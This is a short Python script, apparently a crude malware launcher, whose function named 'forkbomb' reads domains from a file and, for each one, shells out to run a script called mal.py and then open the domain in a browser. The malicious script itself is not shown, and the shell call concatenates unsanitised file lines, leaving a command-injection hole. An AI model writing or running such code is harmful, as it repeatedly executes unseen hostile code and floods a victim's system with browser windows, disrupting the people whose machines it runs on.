import os
import random
def forkbomb():
  number = 0
  file = open("domains.txt", "r")
  content = file.readlines()
  for line in content:
    os.system("python mal.py && xdg-open https://" + line)
